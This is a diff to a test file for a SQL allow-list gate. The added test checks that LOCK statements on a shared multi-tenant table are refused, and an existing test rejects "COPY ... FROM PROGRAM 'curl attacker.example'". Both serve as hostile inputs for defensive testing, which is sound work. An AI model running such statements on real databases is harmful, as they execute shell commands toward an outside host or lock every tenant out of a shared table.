@@ -200,6 +200,15 @@ describe('assertWorkerSqlAllowed — bodies that execute as code', () => {
     expect(allowed("COPY zvd_orders FROM PROGRAM 'curl attacker.example'")).toBe(false);
   });
 
+  it('refuses LOCK — names no table the allowlist below can see, and Postgres grants it on the SELECT the worker already holds', () => {
+    // `zvd_*` is a shared physical table across every tenant (RLS filters
+    // rows, it does not split the table), so an ACCESS EXCLUSIVE lock on one
+    // freezes every tenant's access to it, not just this extension's own rows.
+    expect(allowed('LOCK TABLE zvd_orders IN ACCESS EXCLUSIVE MODE')).toBe(false);
+    expect(allowed('LOCK zvd_orders')).toBe(false);
+    expect(allowed('lock table "zvd_orders"')).toBe(false);
+  });
+
   it('does not fire on ordinary SQL that merely contains the words', () => {
     // A gate that rejects `ON CONFLICT DO NOTHING` would be turned off.
     expect(allowed('INSERT INTO zvd_orders (id) VALUES ($1) ON CONFLICT DO NOTHING')).toBe(true);
